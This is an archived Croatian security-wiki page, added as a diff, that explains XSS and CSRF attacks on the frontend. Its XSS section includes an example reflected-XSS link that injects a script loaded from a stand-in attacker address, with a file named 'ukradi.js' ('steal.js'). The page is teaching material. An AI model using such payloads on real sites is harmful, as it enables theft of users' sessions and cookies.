@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Uspoređivanje sigurnosti između frontend frameworka - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Uspoređivanje_sigurnosti_između_frontend_frameworka skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Uspoređivanje sigurnosti između frontend frameworka</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html#mw-head">orijentacija</a>,
+					<a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Uspoređivanje sigurnosti različitih frontend frameworka, njihova pervencija napada(XSS, CSRF/XSRF).
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html#Cross-site_Scripting_.28XSS.29"><span class="tocnumber">2</span> <span class="toctext">Cross-site Scripting (XSS)</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html#Cross-Site_Request_Forgery_.28CSRF.29"><span class="tocnumber">3</span> <span class="toctext">Cross-Site Request Forgery (CSRF)</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Uvod"> Uvod </span></h2>
+<p>Kada pomislimo na web sigurnost prvenstveno pomislimo na back end sigurnost, odnosno na sigurnost podataka koji su smješteni na serveru. Istina je da su podaci smješteni na serveru i da im se pristupa kroz back end, ali treba imati u vidu da su ti podaci preuzimani i prikazivani od front end strane što otvara prostor napadačima ugroziti iskustvo korištenja korisnicima. Primjer front end napada su XSS i CSRF napadi. U nastavku će biti opisani takvi napadi, te načini na koji se oni sprječavaju u nekim front end frameworkovima.
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Cross-site_Scripting_.28XSS.29"> Cross-site Scripting (XSS) </span></h2>
+<p>Cross-site Scripting (XSS) napadi su vrsta injection napada, gdje se skripte injectaju u korisnicima pouzdane stranice. Kako bi se izvršio XSS napad, napadač mora kroz web aplikaciju poslati zlonamjerni kod (obično client-side skripte) korisniku koji pristupa stranici. „Rupe“ koje napadaču omogućavaju napade su obično input HTML elementi čiji se sadržaj ispisuje negdje na stranici bez prethodne provjere unesenog sadržaja u input element. Prilikom korištenja stranice korisnik nije uopće svjestan da je napadnut, odnosno da mu se odvija skripta koja nije izvorno namijenjena za stranicu koju posjećuje. Takve zlonamjerne skripte mogu pokrasti stvari kao što su sadržaji cookie-ja, sesija, sadržaj stranice itd. Treba naglasiti kako su XSS napadi jedna od najčešćih vrsta napada koja se događa na webu.
+</p><p>Postoje 3 vrste XSS napada: 
+</p><p>•	Pohranjeni XSS (Type 1) – pohranjeni XSS se događa kada napadač ima mogućnost kroz input elemente spremiti zlonamjerni kod na server. To se obično događa kroz forum postove, komentare na stvari i slično. Opasan je zbog toga što će se učitati svakom korisniku koji pristupi stranici na koju se očitava zlonamjerni kod spremljen na server. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:StoredXSS.PNG" class="image"><img alt="StoredXSS.PNG" src="../images/b/be/StoredXSS.PNG" width="541" height="313" /></a>
+</p><p><br />
+•	Reflektirajući XSS (Type 2) – ovaj XSS napada koristi GET i POST zahtjeve sa URL-ova, kojima se pristupa obično kroz poveznicu na napadačevu stranicu koja će poslati POST zahtjev stranici koju želi napasti. Ova vrsta napada je manje opasana jer zahtjeva od korisnika da klikne na poveznicu koja će ga odvesti do zlonamjerne skripte. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:ReflectedXSS.PNG" class="image"><img alt="ReflectedXSS.PNG" src="../images/f/fd/ReflectedXSS.PNG" width="547" height="322" /></a>
+</p><p>•	XSS baziran na DOM (Type 0) – ova vrsta XSS napada ne koristi server prilikom izvođena, odnosno svi zaraženi podaci, od izvora do ponora se nalaze unutar preglednika, odnosno unutar DOM-a. Tako npr. izvor može biti URL, a ponor može biti neka funkcija koja će izvršiti zlonamjernu radnju.  
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:DOMXSS.PNG" class="image"><img alt="DOMXSS.PNG" src="../images/e/e1/DOMXSS.PNG" width="575" height="327" /></a>
+</p><p><b>Primjer XSS napada:</b>
+</p><p><br />
+•	Tomu zanima sport i prati određenu stranicu koja donosi sportske novosti. 
+</p><p>•	Jednog dana, tražeći sportske novosti naiđe na oglas koji oglašava novu stranicu sa najnovijim vijestima iz svijeta sporta. 
+</p><p>•	Kao sportski fan Tomo odluči kliknuti na oglas. Tomo nije uvidio da poveznica izgleda nešto slično kao: <a href="http://nekastranicazasportskenovosti.hr?search=nogomet%3Cscript+src%3D%2210.100.0.40:8080%2Fukradi.js%22%3E%3C%2Fscript%3E" class="external free" rel="nofollow">http://nekastranicazasportskenovosti.hr?search=nogomet%3Cscript+src%3D%2210.100.0.40:8080%2Fukradi.js%22%3E%3C%2Fscript%3E</a> 
+</p><p>•	Poveznica izgleda kao nešto komplicirano, ali kad se poveznica malo dekodira ona izgleda kao: http:// nekastranicazasportskenovosti.hr?search=nogomet &lt;script src=”10.100.0.40:8080/ukradi.js”&gt;&lt;/script&gt;
+</p><p>•	Stranica na koju je Tomo kliknuo će se otvoriti, te će se pretražiti pojam nogometa, odnosno izlistati će se članci vezani uz nogomet, ali će se izvršiti i skripta koja je skrivena unutar URL-a
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Cross-Site_Request_Forgery_.28CSRF.29"> Cross-Site Request Forgery (CSRF) </span></h2>
+<p>Cross-Site Request Forgery (CSRF) napadi su napadi gdje korisnik web aplikacije, koji je ulogiran u nju, izvršava neželjene radnje na njoj. XSS napadi su se temeljili na korisnikovom povjerenju stranici koju posjećuje, dok je kod CSRF napada situacija obrnuta, odnosno stranice imaju povjerenja u korisnikove radnje. Način na koji CSRF napadi funkcioniraju su takvi da napadač korisnika prevari na način da phishing metodama natjera korisnika da pošalje zlonamjerni zahtjev. Nakon toga on može preuzeti korisnikov identitet i sve privilegije koje dolaze skupa s njim te raditi zlonamjerne radnje u korisnikovo ime. Kako preglednici funkcioniraju tako da ne provjeravaju tko ulazi na koju stranicu, odnosno ne provjeravaju način na koji smo mi dobili sadržaj cookie-ja ili sesija, nego oni samo provjeravaju da li je sadržaj točan, to svojsto daje mogućnost napadačima izvršavati ovakve vrste napada. Preko zlonamjernih zahtjeva napadač može saznati sadržaj cookie-ja, IP adresu i sl. Pomoću CSRF-a napadač može raditi transakcije u ime korisnika, promijeniti njegovu šifru, izbrisati račun itd. CSRF je poznat i pod drugim imenima kao što su XSRF, Sea Surf ili Session Riding, te je također jedan od najčešćih vrsta napada na web aplikacije.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:CSRF.PNG" class="image"><img alt="CSRF.PNG" src="../images/2/2b/CSRF.PNG" width="829" height="473" /></a>
+</p>
+<!-- 
+NewPP limit report
+Preprocessor node count: 11/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:9902-0!*!0!!hr!2!edit=0 and timestamp 20190203204139 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html">http://security.foi.hr/wiki/index.php/Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Uspoređivanje_sigurnosti_između_frontend_frameworka.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Uspore%C4%91ivanje_sigurnosti_izme%C4%91u_frontend_frameworka&amp;oldid=41557" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 13:19, 12. siječnja 2018.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 130 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Uspoređivanje_sigurnosti_između_frontend_frameworka", "wgTitle": "Uspoređivanje sigurnosti između frontend frameworka", "wgAction": "view", "wgArticleId": 9902, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 41557, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.268 secs. -->			</body>
+</html>
